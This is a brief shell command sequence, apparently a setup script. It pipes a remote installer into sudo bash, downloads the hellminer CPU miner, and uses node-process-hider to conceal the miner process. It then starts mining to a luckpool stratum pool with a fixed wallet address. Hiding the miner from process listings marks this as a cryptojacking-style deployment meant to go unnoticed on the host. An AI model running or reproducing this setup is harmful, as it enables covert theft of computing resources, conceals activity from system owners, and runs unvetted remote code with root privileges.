sudo apt update
clear
sudo apt install screen
screen -R nheqminer
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && sudo ph add hellminer && apt install screen && screen 
screen -R hellminer
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RSC1ZnrrkGLuperMYD4Ta6FYnG7jFfuf4T.CPU2 -p x --cpu 10
